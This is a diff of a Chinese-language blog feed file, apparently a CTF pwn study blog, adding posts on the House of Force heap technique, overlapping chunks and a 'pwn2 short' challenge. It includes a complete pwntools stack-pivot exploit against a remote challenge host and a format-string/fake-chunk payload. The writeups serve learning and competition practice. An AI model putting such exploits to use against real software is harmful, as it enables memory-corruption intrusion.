@@ -4,6 +4,58 @@
   
     
     <entry>
+      <title>200~house_of_force</title>
+      <link href="/2024/11/03/house-of-force/"/>
+      <url>/2024/11/03/house-of-force/</url>
+      
+        <content type="html"><![CDATA[<p>利用条件：能控制topchunk_size，能够自由控制申请的堆块大小。需要知道top_chunk地址与目的地址的偏移量，如果还不对齐，即结果不是0x0结尾，需要多减8，然后减去SIZE_SZ（8）</p><p>结果：能将topcunk的地址控制到我们想要的地址，再申请内存就可以控制这个地址的值。</p><h4 id="check1"><a href="#check1" class="headerlink" title="check1"></a>check1</h4><p>对topchunk_size的检查，(unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)</p><pre><code class="lang-c++">// 获取当前的top chunk，并计算其对应的大小victim = av-&gt;top;size   = chunksize(victim);// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) &#123;    remainder_size = size - nb;    remainder      = chunk_at_offset(victim, nb);    av-&gt;top        = remainder;    #设置top_chunk的头，附近值会有所变化    set_head(victim, nb | PREV_INUSE |            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));    set_head(remainder, remainder_size | PREV_INUSE);    check_malloced_chunk(av, victim, nb);    void *p = chunk2mem(victim);    alloc_perturb(p, bytes);    return p;&#125;</code></pre><p>所以把size改为-1，在补码中为很大的数，能够满足条件</p><h5 id="新的remainder即top-chunk的地址-remainder-chunk-at-offset-victim-nb-，需要算出topchunk的地址和目标地址的偏移"><a href="#新的remainder即top-chunk的地址-remainder-chunk-at-offset-victim-nb-，需要算出topchunk的地址和目标地址的偏移" class="headerlink" title="新的remainder即top_chunk的地址  **remainder = chunk_at_offset(victim, nb);**，需要算出topchunk的地址和目标地址的偏移"></a>新的remainder即top_chunk的地址  <code>**remainder = chunk_at_offset(victim, nb);**</code>，需要算出topchunk的地址和目标地址的偏移</h5><h4 id="check2"><a href="#check2" class="headerlink" title="check2"></a>check2</h4><p>对申请的size的检查</p><pre><code class="lang-c++">/*   Check if a request is so large that it would wrap around zero when   padded and aligned. To simplify some other code, the bound is made   low enough so that adding MINSIZE will also not wrap around zero. */#这里的req即是nb.对req的大小的检查，((unsigned long) (req)要小于 (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))#define REQUEST_OUT_OF_RANGE(req)                                              \    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))/* pad request bytes into a usable size -- internal version *///MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1# 对nb加 SIZE_SZ加 MALLOC_ALIGN_MASK,最后和MALLOC_ALIGN_MASK按位与对齐,这里的SIZE_SZ是8#define request2size(req)                                                      \    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \         ? MINSIZE                                                             \         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)/*  Same, except also perform argument check */# req不能大于 -2 * MINSIZE，否则会报错#define checked_request2size(req, sz)                                          \    if (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \        __set_errno(ENOMEM);                                                   \        return 0;                                                              \    &#125;                                                                          \    (sz) = request2size(req);</code></pre><h5 id="首先-unsigned-long-req-lt-unsigned-long-INTERNAL-SIZE-T-2-MINSIZE-，即无符号的nb要小于无符号的-2-MINSIZE，即req不能大于-2MINSIZE-，一般都能满足条件。"><a href="#首先-unsigned-long-req-lt-unsigned-long-INTERNAL-SIZE-T-2-MINSIZE-，即无符号的nb要小于无符号的-2-MINSIZE，即req不能大于-2MINSIZE-，一般都能满足条件。" class="headerlink" title="首先  ((unsigned long) (req) &lt;= (unsigned long) (INTERNAL_SIZE_T)(-2  MINSIZE))，即无符号的nb要小于无符号的  **-2  MINSIZE，即req不能大于-2MINSIZE*，一般都能满足条件。"></a>首先  ((unsigned long) (req) &lt;= (unsigned long) (INTERNAL_SIZE_T)(-2 <em> MINSIZE))，即无符号的nb要小于无符号的  **-2 </em> MINSIZE<strong>，即req不能大于</strong>-2<em>MINSIZE*</em>，一般都能满足条件。</h5><h5 id="其次是对req的对齐的检查，req需要是0x0结尾来对齐，否则得多减8"><a href="#其次是对req的对齐的检查，req需要是0x0结尾来对齐，否则得多减8" class="headerlink" title="其次是对req的对齐的检查，req需要是0x0结尾来对齐，否则得多减8"></a>其次是对req的对齐的检查，req需要是0x0结尾来对齐，否则得多减8</h5><h5 id="req-SIZE-SZ-MALLOC-ALIGN-MASK-amp-MALLOC-ALIGN-MASK-，这里的结果是最后申请的大小。由于-req-SIZE-SZ，SIZE-SZ是8，所以算出偏移后还需要减去8，虽然req会加上MALLOC-ALIGN-MASK，但是最后会被对齐掉，就不用多减掉MALLOC-ALIGN-MASK了"><a href="#req-SIZE-SZ-MALLOC-ALIGN-MASK-amp-MALLOC-ALIGN-MASK-，这里的结果是最后申请的大小。由于-req-SIZE-SZ，SIZE-SZ是8，所以算出偏移后还需要减去8，虽然req会加上MALLOC-ALIGN-MASK，但是最后会被对齐掉，就不用多减掉MALLOC-ALIGN-MASK了" class="headerlink" title="((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)，这里的结果是最后申请的大小。由于(req) + SIZE_SZ，SIZE_SZ是8，所以算出偏移后还需要减去8，虽然req会加上MALLOC_ALIGN_MASK，但是最后会被对齐掉，就不用多减掉MALLOC_ALIGN_MASK了"></a>((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)，这里的结果是最后申请的大小。由于(req) + SIZE_SZ，SIZE_SZ是8，所以算出偏移后还需要减去8，虽然req会加上MALLOC_ALIGN_MASK，但是最后会被对齐掉，就不用多减掉MALLOC_ALIGN_MASK了</h5><p><code>MALLOC_ALIGN</code> 通常指的是内存块对齐的要求。如果req不对齐，不是0x0结尾的，需要多减掉8</p><h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a>bcloud_bctf_2016</h2><p>只开了栈上的保护</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241104192949440.png" alt="image-20241104192949440"></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241104193057354.png" alt="image-20241104193057354"></p><p>这里会把堆的地址给到v2的指针，后续会打印出来</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241104193219359.png" alt="image-20241104193219359"></p><p>🐕Ⅷ题目，调试的时候完全不是题目逻辑，算了。</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/2024/10/29/pwn2%20short/"/>
+      <url>/2024/10/29/pwn2%20short/</url>
+      
+        <content type="html"><![CDATA[<h1 id="pwn2-short"><a href="#pwn2-short" class="headerlink" title="pwn2 short"></a>pwn2 short</h1><p>很简单的32位栈迁移，还留了个后门</p><p>这里获得栈地址</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241029170723988.png" alt="image-20241029170723988"></p><p>把bin/sh的地址放返回地址后面就ok</p><pre><code class="lang-py">from pwn import*from LibcSearcher import *p=remote(&quot;0192d5ebf7187dfe967b1c88a2bb1480.3sya.dg02.ciihw.cn&quot;,43744)#p=process(&quot;./short&quot;)context.log_level=&quot;debug&quot;p.sendlineafter(&#39;username: &#39;,&#39;admin&#39;)p.sendlineafter(&#39;password: &#39;,&#39;admin123&#39;)p.recvuntil(&#39;0x&#39;)stack=int(p.recv(8),16)print(hex(stack))pop_edi=0x0804884apop_ebx=0x08048411gift=0x080485E6leave=0x08048674binsh=0x0804A038 payload=p32(gift)+p32(0)+p32(binsh)+b&#39;a&#39;*68+p32(stack-4)+p32(leave)#gdb.attach(p)sleep(1)p.sendlineafter(&quot;msg:&quot;,payload)p.interactive()</code></pre>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>overlapping_chunks</title>
+      <link href="/2024/10/21/overlapping_chunks/"/>
+      <url>/2024/10/21/overlapping_chunks/</url>
+      
+        <content type="html"><![CDATA[<p>大多都是堆溢出的情况下，chunk释放前或释放后改变size的值，再申请的时候造成两个堆块有重合的地方，有时候需要改变对应下一个堆的pre_size绕过检查，虽说在libc2.29以后才出现，但有时候2.23的版本还是会因此而报错。所以尽可能的在下一个chunk的pre_size位改成我们的size.</p><pre><code class="lang-c++">/* consolidate backward */    if (!prev_inuse(p)) &#123;      prevsize = prev_size (p);      size += prevsize;      p = chunk_at_offset(p, -((long) prevsize));      /* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */      if (__glibc_unlikely (chunksize(p) != prevsize))        malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);      unlink_chunk (av, p);    &#125;</code></pre><h2 id="2015-hacklu-bookstore"><a href="#2015-hacklu-bookstore" class="headerlink" title="2015 hacklu bookstore"></a>2015 hacklu bookstore</h2><p>该程序是动态链接的 64 位程序，主要开启了 Canary 与 NX 保护.</p><p>程序的最后有个格式化字符串漏洞，只能用一次，用于泄露libc和在fini的地方写上main函数地址</p><p>这里输入s是能写上栈的地方，这里输入fini的地址</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241021202201568.png" alt="image-20241021202201568"></p><p>算出偏移是13</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241021210331631.png" alt="image-20241021210331631"></p><p>这里只强调构造的fake_chunk</p><pre><code class="lang-py">payload=b&#39;%2828c%13$hnkk%31$p&#39;payload=payload.ljust(0x88,b&#39;b&#39;)payload+=p64(0x151)payload=payload.ljust(0x1d0,b&#39;\x41&#39;)+p64(0x150)+p64(0x41)+p64(0)*6+p64(0x40)+p64(0x31)</code></pre><p>申请堆的过程中有堆溢出可以更改下一个 堆的size，改成下面特殊的堆的size，根据题目给大小改。</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241021220811817.png" alt="image-20241021220811817"></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241021220706913.png" alt="image-20241021220706913"></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>heapcreator</title>
+      <link href="/2024/10/17/heapcreator/"/>
+      <url>/2024/10/17/heapcreator/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>stdout</title>
       <link href="/2024/09/21/stdout/"/>
       <url>/2024/09/21/stdout/</url>
@@ -34,7 +86,7 @@
       <link href="/2024/09/13/glibc/"/>
       <url>/2024/09/13/glibc/</url>
       
-        <content type="html"><![CDATA[<h3 id="手动下载glibc版本"><a href="#手动下载glibc版本" class="headerlink" title="手动下载glibc版本"></a>手动下载glibc版本</h3><p> 有时候做题会遇到glibc-all-in-one里没有的glibc,需要自己下</p><p>可以到网站手动下载对应的./deb文件</p><p>在glibc-all-in-one目录下，若glibc版本名为x,用指令解压</p><pre><code class="lang-py">./extract ./x.deb ./libs/x</code></pre><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240913170944068.png" alt="image-20240913170944068"></p>]]></content>
+        <content type="html"><![CDATA[<h3 id="手动下载glibc版本"><a href="#手动下载glibc版本" class="headerlink" title="手动下载glibc版本"></a>手动下载glibc版本</h3><p> 有时候做题会遇到glibc-all-in-one里没有的glibc,需要自己下</p><p>可以到网站手动下载对应的./deb文件</p><pre><code class="lang-py">http://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc/</code></pre><p>在glibc-all-in-one目录下，若glibc版本名为x,用指令解压</p><pre><code class="lang-py">./extract ./x.deb ./libs/x</code></pre><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240913170944068.png" alt="image-20240913170944068"></p>]]></content>
       
       
       
